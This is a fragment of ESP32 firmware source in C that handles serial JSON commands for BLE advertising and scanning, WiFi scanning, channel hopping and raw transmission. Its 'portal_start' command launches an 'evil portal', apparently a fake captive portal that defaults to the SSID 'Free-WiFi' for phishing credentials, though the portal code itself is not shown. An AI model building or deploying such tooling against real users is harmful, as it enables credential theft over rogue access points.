                        .disc_mode = BLE_GAP_DISC_MODE_GEN,
                        .itvl_min = 32, // 20ms
                        .itvl_max = 64, // 40ms
                    };
                    uint8_t own_addr_type;
                    ble_hs_id_infer_auto(0, &own_addr_type);
                    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);
                    if (rc == 0) {
                        g_ble_adv_active = true;
                        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
                        puts("{\"event\":\"ble_adv_started\"}");
                        fflush(stdout);
                        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
                        return;
                    }
                }
            }
        }
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"error\",\"message\":\"ble_adv_raw failed\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"ble_adv_stop\"")) {
        ble_gap_adv_stop();
        g_ble_adv_active = false;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"ble_adv_stopped\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"ble_scan_on\"")) {
        g_ble_scanning = true;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"ble_scan_started\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"ble_scan_off\"")) {
        g_ble_scanning = false;
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"ble_scan_stopped\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"portal_start\"")) {
        char ssid[33] = "Free-WiFi";
        char tmpl[16] = "router";
        const char *ssid_pos = strstr(line, "\"ssid\":\"");
        if (ssid_pos) {
            sscanf(ssid_pos + 8, "%32[^\"]", ssid);
        }
        const char *tmpl_pos = strstr(line, "\"template\":\"");
        if (tmpl_pos) {
            sscanf(tmpl_pos + 12, "%15[^\"]", tmpl);
        }
        start_evil_portal(ssid, tmpl);
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        printf("{\"event\":\"portal_started\",\"ssid\":\"%s\",\"template\":\"%s\"}\n", ssid, tmpl);
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"portal_stop\"")) {
        stop_evil_portal();
        if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
        puts("{\"event\":\"portal_stopped\"}");
        fflush(stdout);
        if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);
        return;
    }

    if (strstr(line, "\"cmd\":\"scan_wifi\"")) {
        scan_wifi();
        return;
    }
}

// Serial Listener FreeRTOS Task
static void serial_listener_task(void *param)
{
    static char rx_line[2048];
    int line_idx = 0;

    while (true) {
        int c = getchar();
        if (c != EOF) {
            if (c == '\n' || c == '\r') {
                if (line_idx > 0) {
                    rx_line[line_idx] = '\0';
                    process_serial_command(rx_line);
                    line_idx = 0;
                }
            } else {
                if (line_idx < (int)sizeof(rx_line) - 1) {
                    rx_line[line_idx++] = (char)c;
                }
            }
        } else {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }
}

void app_main(void)
{
    g_serial_mutex = xSemaphoreCreateMutex();
    initialize_leds();

    esp_err_t nvs_result = nvs_flash_init();
    if (nvs_result == ESP_ERR_NVS_NO_FREE_PAGES || nvs_result == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        nvs_result = nvs_flash_init();
    }
    ESP_ERROR_CHECK(nvs_result);

    initialize_wifi();
    initialize_ble();

    xTaskCreate(channel_hop_task, "ch_hop", 2048, NULL, 3, NULL);
    xTaskCreate(serial_listener_task, "serial_rx", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "ready; radio transceiver active at 115200 baud");

    if (g_serial_mutex) xSemaphoreTake(g_serial_mutex, portMAX_DELAY);
    puts("{\"event\":\"ready\",\"mode\":\"transceiver\",\"capabilities\":[\"tx_raw\",\"promisc\",\"ble_adv\",\"ch_hop\",\"scan\",\"ws2812\",\"dual_band\"]}");
    fflush(stdout);
    if (g_serial_mutex) xSemaphoreGive(g_serial_mutex);

    while (true) {
        if (g_auto_scan_enabled && !g_promisc_enabled && !g_channel_hopping) {
            scan_wifi();
        }
        vTaskDelay(pdMS_TO_TICKS(3000));
    }
}

